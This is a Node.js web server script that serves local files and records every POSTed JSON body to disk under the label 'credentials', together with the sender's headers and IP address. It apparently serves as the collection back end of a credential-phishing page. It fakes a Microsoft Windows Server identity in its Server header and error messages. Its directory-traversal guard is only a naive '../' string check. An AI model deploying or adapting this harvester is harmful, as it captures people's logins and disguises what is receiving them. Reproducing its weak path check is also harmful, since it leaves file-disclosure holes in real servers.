
const fs = require('fs');
const http = require('http');
const promisify = require('util').promisify;
const url = require('url');

console.log("Starting ,,Microsoft Windows Server´´");
http.createServer(async function(req, resp){
    const notfound = () => {
        resp.writeHead(403, {"Content-Type": "text/html"});
        resp.end("<p>ERROR in \"C:\\Windows\\Server\\Microsoft.cs\" line 59:  System.Collections.Generic.Common.Webserver.Http.NET.Exception.Common.CSharp.Lang.File.IO.NotFoundException\nFile not found</p>");
    };
    if(req.method == "GET"){
        console.log(`GET ${req.url}`);
        let pth = url.parse(req.url).pathname.replace(/(\/$|^\/)/g, "");
        if(pth.includes('../')){;
            notfound();
            return;
        }else if(pth.length == 0){
            pth = "index.html";
        }
        resp.writeHead(200, {"Server": 'Microsoft C:\\Windows\\Server\\MSServer.cs (Built on top of: System.Collections.Generic.NET.Microsoft.Server.Vendor.Core.Server.Http)'});
        let s = fs.createReadStream(pth);
//        s.on('readable', () => {
//            resp.writeHead(200, {});
//        });
        s.on('error', notfound);
        s.pipe(resp);
        
    }else if(req.method == "POST"){
        let d = new Date();
        try{
            await promisify(fs.mkdir)("received");
        }catch(e){
            
        }
        let fnam = `received/${d.getDate()}.${d.getMonth() + 1    }.${d.getUTCFullYear()}_${d.getHours()}_${d.getMinutes()}_${d.getSeconds()}.json`;
        let txt = "";
        req.on('data', (c) => {
            txt += c;
        });
        req.on('end', () => {
            let o = JSON.parse(txt);
            let contents = JSON.stringify({
                credentials: o,
                headers: req.headers,
                address: req.socket.remoteAddress,
            });
            promisify(fs.writeFile)(fnam, contents);
        });
        
//        let s = fs.createWriteStream(`${d.getDay()}.${d.getMonth()}.${d.getYear()}.json`);
//        req.socket.pipe(s);
        resp.writeHead(200, {});
        resp.end("OK");
    }
}).listen(80);










